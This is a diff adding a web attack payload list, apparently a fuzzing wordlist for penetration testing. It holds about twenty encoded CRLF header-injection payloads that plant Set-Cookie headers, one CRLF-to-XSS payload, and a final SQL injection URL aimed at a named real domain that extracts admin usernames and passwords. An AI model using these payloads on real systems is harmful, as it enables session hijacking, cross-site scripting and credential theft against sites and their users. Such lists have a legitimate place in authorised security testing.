@@ -1,0 +1,30 @@
+/%%0a0aSet-Cookie:crlf=injection
+/%0aSet-Cookie:crlf=injection
+/%0d%0aSet-Cookie:crlf=injection
+/%0dSet-Cookie:crlf=injection
+/%23%0aSet-Cookie:crlf=injection
+/%23%0d%0aSet-Cookie:crlf=injection
+/%23%0dSet-Cookie:crlf=injection
+/%25%30%61Set-Cookie:crlf=injection
+/%25%30aSet-Cookie:crlf=injection
+/%250aSet-Cookie:crlf=injection
+/%25250aSet-Cookie:crlf=injection
+/%2e%2e%2f%0d%0aSet-Cookie:crlf=injection
+/%2f%2e%2e%0d%0aSet-Cookie:crlf=injection
+/%2F..%0d%0aSet-Cookie:crlf=injection
+/%3f%0d%0aSet-Cookie:crlf=injection
+/%3f%0dSet-Cookie:crlf=injection
+/%u000aSet-Cookie:crlf=injection
+%0D%0Avirus:%20value
+%0ASet-Cookie:%20crlfinjection=%20value
+%0ASet-Cookie: crlfinjection%0A%0A<img src=x onerror=prompt(document.domain)> For XSS
+__session_start__/%0aSet-Cookie:malicious_cookie1
+dtCookie=injected_by_Huzefa_Surme
+
+
+#special payload
+/%E5%98%8D%E5%98%8ASetCookie:crlfinjection=crlfinjection
+
+
+
+http://flow.microsoft.com/showcategory.php?cid=-1/**/UNION/**/ALL/**/SELECT/**/1,concat(0x3C666F6E7420636F6C6F723D22726564223E,admin_name,0x3a,pwd,0x3C2F666F6E743E),3,4,5/**/FROM/**/sbwmd_admin/*
